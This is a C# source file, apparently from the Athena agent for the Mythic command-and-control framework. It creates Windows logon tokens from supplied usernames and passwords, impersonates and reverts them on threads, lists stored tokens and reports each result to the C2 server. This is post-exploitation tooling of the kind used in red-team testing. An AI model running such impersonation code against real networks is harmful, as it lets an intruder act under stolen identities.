﻿using Athena.Models.Mythic.Tasks;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

using Athena.Plugins;
using Athena.Models.Mythic.Checkin;
using System.Text.Json;
using Athena.Models;
using System.Security.Principal;

namespace Athena.Commands
{
    public class TokenHandler
    {
        static Dictionary<int, SafeAccessTokenHandle> tokens = new Dictionary<int, SafeAccessTokenHandle>();
        /// <summary>
        /// Create a Token for impersonation
        /// </summary>
        /// <param name="job">The MythicJob containing the token information</param>
        public async Task<string> CreateToken(MythicJob job)
        {
            CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                if (Pinvoke.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Pinvoke.LogonType.LOGON32_LOGON_NETWORK : Pinvoke.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Pinvoke.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    Token token = new Token()
                    {
                        Handle = hToken.DangerousGetHandle().ToInt64(),
                        description = tokenOptions.name,
                        token_id = tokens.Count + 1
                    };

                    if (tokenOptions.username.Contains("@"))
                    {
                        string[] split = tokenOptions.username.Split('@');
                        token.user = $"{split[1]}\\{split[0]}";
                    }
                    else
                    {
                        token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
                    }


                    tokens.Add(tokens.Count + 1, hToken);

                    return new TokenResponseResult()
                    {
                        user_output = $"Token created for {tokenOptions.username}",
                        completed = true,
                        task_id = job.task.id,
                        tokens = new List<Token>() { token },
                        callback_tokens = new List<CallbackToken> { new CallbackToken()
                        {
                            action = "add",
                            host = System.Net.Dns.GetHostName(),
                            token_id = token.token_id,
                        } }

                    }.ToJson();
                }
                else
                {
                    return new ResponseResult()
                    {
                        user_output = $"Failed to create token: {Marshal.GetLastWin32Error()}",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson();
                }

            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = $"Failed to create token: {e.ToString()}",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson();
            }
        }
        /// <summary>
        /// Begin impersonation for the thread
        /// </summary>
        /// <param name="job">The token ID</param>
        public async Task<bool> ThreadImpersonate(int t)
        {
            if (tokens.ContainsKey(t))
            {
                return Pinvoke.ImpersonateLoggedOnUser(tokens[t]);
            }
            return false;
        }
        /// <summary>
        /// End impersonation for the thread
        /// </summary>
        public async Task<bool> ThreadRevert()
        {
            return Pinvoke.RevertToSelf();
        }
        /// <summary>
        /// List available tokens for impersonation
        /// </summary>
        /// <param name="job">The MythicJob containing the token information</param>
        public async Task<string> ListTokens(MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Tokens:");
            sb.AppendLine("------------------------------");
            foreach (var token in tokens)
            {
                sb.AppendFormat($"{token.Key}").AppendLine();
            }

            return new ResponseResult()
            {
                completed = true,
                user_output = sb.ToString(),
                task_id = job.task.id,
            }.ToJson();
        }
        public static int getIntegrity()
        {
            bool isAdmin;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                var principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            return isAdmin ? 3 : 2;
        }
    }
}
